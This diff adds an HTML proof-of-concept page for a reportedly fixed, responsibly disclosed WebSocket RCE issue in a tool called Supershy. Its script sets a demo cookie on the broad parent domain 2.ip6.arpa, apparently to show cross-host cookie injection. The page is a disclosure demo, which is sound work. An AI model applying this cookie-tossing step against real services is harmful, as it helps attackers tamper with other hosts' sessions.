@@ -1,0 +1,37 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Supershy WebSocket RCE PoC</title>
+    <script src="https://cdn.jsdelivr.net/npm/socket.io-client@4.7.2/dist/socket.io.min.js"></script>
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+<h1>cookie.c.e.0.b.0.7.4.0.1.0.0.2.ip6.arpa</h1>
+<p class="subtext">Tested locally against the vulnerable version of Supershy.</p>
+
+<img src="https://cdn.dashnet.org/cookieclicker/img/perfectCookie.png" alt="Seal">
+
+<div class="buttons">
+    <button onclick="setCookie()">Set Cookie</button>
+</div>
+
+<pre id="log">Waiting to set cookie...</pre>
+
+<script>
+    function setCookie() {
+        const v = crypto.randomUUID();
+        document.cookie = `demo=${v}; Domain=2.ip6.arpa; Path=/; Secure; SameSite=Lax; Max-Age=600`;
+        document.getElementById("log").textContent = "Cookie set.";
+    }
+</script>
+
+<div class="footer">
+    This is a PoC for a vulnerability reported through responsible disclosure.<br>
+    It was fixed quickly by the Supershy dev. This page is here for demo and educational purposes.<br>
+    More info: <a href="https://elliott.diy/blog/supershy" target="_blank">elliott.diy</a> • <a href="https://github.com/elliott-diy" target="_blank">GitHub</a>
+</div>
+
+
+</body>
+</html>
